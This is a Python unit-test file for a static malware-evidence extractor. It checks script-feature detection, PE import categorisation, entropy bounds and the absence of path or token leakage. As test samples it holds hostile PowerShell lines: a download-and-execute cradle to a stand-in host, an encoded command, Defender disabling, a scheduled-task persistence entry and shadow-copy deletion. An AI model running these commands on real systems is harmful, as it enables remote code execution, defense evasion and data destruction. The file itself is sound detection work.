"""Pure static analysis fixtures; no executable code, API calls, or file writes."""
import json
from pathlib import Path
import struct
import unittest
from unittest import mock

from security_guard import evidence


def pe_fixture(imports=(), *, bits=32):
    """Non-executable header/table fixture with no instructions or entry point."""
    body = bytearray(4096)
    body[:2] = b"MZ"
    struct.pack_into("<I", body, 0x3c, 0x80)
    body[0x80:0x84] = b"PE\0\0"
    optional = 0x98
    optional_size = 224 if bits == 32 else 240
    struct.pack_into("<H", body, 0x86, 1)
    struct.pack_into("<H", body, 0x94, optional_size)
    struct.pack_into("<H", body, optional, 0x10b if bits == 32 else 0x20b)
    struct.pack_into("<I", body, optional + 60, 0x200)
    directory = 96 if bits == 32 else 112
    struct.pack_into("<I", body, optional + directory - 4, 16)
    section = optional + optional_size
    body[section:section + 8] = b".data\0\0\0"
    struct.pack_into("<IIII", body, section + 8, 0xe00, 0x1000, 0xe00, 0x200)
    if imports:
        struct.pack_into("<II", body, optional + directory + 8, 0x1000, 40)
        struct.pack_into("<IIIII", body, 0x200, 0x1080, 0, 0, 0x1060, 0x1080)
        body[0x260:0x26d] = b"example.dll\0\0"
        cursor = 0x400
        width = 4 if bits == 32 else 8
        for index, name in enumerate(imports):
            encoded = name.encode("ascii") + b"\0"
            body[cursor:cursor + 2] = b"\0\0"
            body[cursor + 2:cursor + 2 + len(encoded)] = encoded
            rva = 0x1000 + cursor - 0x200
            struct.pack_into("<I" if bits == 32 else "<Q", body, 0x280 + index * width, rva)
            cursor += len(encoded) + 2
    return bytes(body)


class EvidenceTests(unittest.TestCase):
    def test_metadata_never_contains_path_filename_content_or_api_names(self):
        secret = "PRIVATE_PERSONAL_TOKEN_12345"
        path = Path(r"C:\Users\PrivateName\confidential.ps1")
        sample = ("IEX (New-Object Net.WebClient).DownloadString('https://private.example/" + secret + "')").encode()
        with mock.patch("builtins.open", side_effect=AssertionError("must not open source")):
            facts = evidence.from_sample(path, sample, len(sample))
        serialized = json.dumps(facts)
        for marker in ["PrivateName", "confidential", secret, "private.example", "DownloadString"]:
            self.assertNotIn(marker, serialized)
        self.assertEqual(set(facts["script_features"]), {"network_fetch", "dynamic_execution"})
        self.assertEqual(facts["signature_status"], "not_checked")

    def test_plain_files_and_network_only_script_do_not_invent_execution(self):
        for path, sample in [("data.txt", b"usual notes"), ("fetch.ps1", b"Invoke-WebRequest https://example.test/file")]:
            facts = evidence.from_sample(path, sample, len(sample))
            self.assertNotIn("dynamic_execution", facts["script_features"])
        self.assertEqual(evidence.from_sample("empty.bin", b"", 0)["entropy"], 0)

    def test_utf16_and_conservative_categorical_script_signals(self):
        text = "powershell -EncodedCommand " + "A" * 64 + "\n[Convert]::FromBase64String('AAAA')\nSet-MpPreference -DisableRealtimeMonitoring $true\nschtasks /Create /TN Example /TR example\nvssadmin delete shadows /all"
        data = text.encode("utf-16")
        facts = evidence.from_sample("example.ps1", data, len(data))
        self.assertTrue({"encoded_command", "base64_decode", "defense_evasion", "persistence", "destructive_commands"}.issubset(facts["script_features"]))
        self.assertLessEqual(set(facts["script_features"]), evidence.SCRIPT_FEATURES)

    def test_regular_admin_terms_do_not_invent_dangerous_behaviour(self):
        sample = b"Get-MpPreference\nGet-ScheduledTask\nWrite-Output 'lsass'\nRemove-Item harmless.tmp\niexample = 1"
        facts = evidence.from_sample("example.ps1", sample, len(sample))
        self.assertEqual(facts["script_features"], [])

    def test_sample_is_bounded_and_entropy_does_not_become_verdict(self):
        data = bytes(range(256)) * 2048
        facts = evidence.from_sample("archive.bin", data, len(data))
        self.assertEqual(facts["sample_bytes"], evidence.SAMPLE_LIMIT)
        self.assertFalse(facts["sample_complete"])
        self.assertEqual(facts["entropy"], 8.0)
        self.assertEqual(facts["script_features"], [])
        self.assertNotIn("malware", facts)

    def test_pe_import_categories_32_and_64_bit_without_api_name_leakage(self):
        for bits in (32, 64):
            with self.subTest(bits=bits):
                data = pe_fixture(["WinHttpOpen", "CreateProcessW", "WriteProcessMemory", "VirtualAllocEx", "CryptUnprotectData"], bits=bits)
                facts = evidence.from_sample("sample.exe", data, len(data))
                self.assertEqual(facts["actual_format"], "pe")
                self.assertEqual(facts["pe_parse_status"], "valid")
                self.assertEqual(facts["pe_sections_count"], 1)
                self.assertTrue({"network", "process_creation", "process_injection", "credential_crypto"}.issubset(facts["pe_import_categories"]))
                self.assertNotIn("WinHttpOpen", json.dumps(facts))

    def test_single_process_memory_api_does_not_imply_injection(self):
        data = pe_fixture(["WriteProcessMemory"])
        facts = evidence.from_sample("sample.exe", data, len(data))
        self.assertNotIn("process_injection", facts["pe_import_categories"])

    def test_malformed_and_truncated_pe_headers_are_bounded(self):
        for data in (b"MZ", b"MZ" + b"\xff" * 80, pe_fixture()[:100]):
            facts = evidence.from_sample("sample.exe", data, len(data))
            self.assertIn(facts["pe_parse_status"], {"invalid", "truncated"})
        whole = pe_fixture(["CreateProcessW"])
        facts = evidence.from_sample("sample.exe", whole[:0x260], len(whole))
        self.assertEqual(facts["pe_parse_status"], "truncated")
        self.assertEqual(facts["pe_import_categories"], [])

    def test_huge_section_count_and_invalid_directory_count_not_followed(self):
        data = bytearray(pe_fixture())
        struct.pack_into("<H", data, 0x86, 65535)
        facts = evidence.from_sample("sample.exe", data, len(data))
        self.assertEqual(facts["pe_sections_count"], 0)
        self.assertEqual(facts["pe_parse_status"], "invalid")
        data = bytearray(pe_fixture(["CreateProcessW"]))
        struct.pack_into("<I", data, 0x98 + 96 + 12, 1)
        facts = evidence.from_sample("sample.exe", data, len(data))
        self.assertEqual(facts["pe_parse_status"], "invalid")

    def test_pdf_and_archives_use_content_not_name(self):
        for data, kind in [(b"%PDF-1.7", "pdf"), (b"PK\x03\x04data", "archive"), (b"7z\xbc\xaf\x27\x1cdata", "archive")]:
            self.assertEqual(evidence.from_sample("misleading.ps1", data, len(data))["actual_format"], kind)

    def test_invalid_sample_arguments_fail_without_source_access(self):
        for sample, size, error in [("text", 4, TypeError), (b"abcd", -1, ValueError), (b"abcd", 3, ValueError), (b"", True, ValueError)]:
            with self.assertRaises(error):
                evidence.from_sample("unused", sample, size)


if __name__ == "__main__":
    unittest.main()
